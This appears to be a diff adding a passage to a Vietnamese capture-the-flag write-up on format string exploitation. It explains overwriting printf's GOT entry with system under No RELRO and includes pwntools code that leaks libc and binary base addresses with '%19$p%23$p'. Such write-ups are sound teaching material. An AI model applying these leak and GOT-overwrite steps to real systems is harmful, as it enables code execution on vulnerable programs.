@@ -358,4 +358,24 @@ Trước tiên hãy xem bảng GOT có gì:
 
 ![Alt text](image/fs25.png)
 
+Trong bảng GOT là địa chỉ các hàm lấy từ libc để dùng cho chương trình binary. Ý tưởng ở đây là ta ghi đè địa chỉ các hàm khác bằng địa chỉ hàm `system` như `fgets` và `printf` là 2 hàm duy nhất là có thể truy cập trong vòng lặp.
+
+RELRO(cơ chế chống ghi đè GOT) đang là No RELRO. Tức quyền của phân vùng GOT là `rw-` cho phép ta ghi đè địa chỉ.
+
+Trước khi ghi đè GOT ta cần tìm 2 thành phần khác: libc base và binary base.
+
+![Alt text](image/fs26.png)
+
+Trong Stack có sẵn địa chỉ libc và binary có thể leak thông qua *format string*.
+
+	p.sendlineafter(b'string: ',b'%19$p%23$p')
+	data=p.recvline().split(b'0x')           //Tạo mảng chứa địa chỉ libc và binary
+	
+	libc_leak=int(data[1],16)				 //Lấy địa chỉ libc
+	libc.address=libc_leak-0x27023
+	
+	exe_leak=int(data[2][:-1],16)			 //Lấy địa chỉ binary
+	exe.address=exe_leak-0x1217
+
+Sau khi có libc và binary base address thì có thể ghi đè lên GOT. Hàm `printf` là đối tượng hợp lý nhất để ghi đè lên. Vì Hàm `fgets` ta còn dùng để đưa payload lên và khai thác. 
 
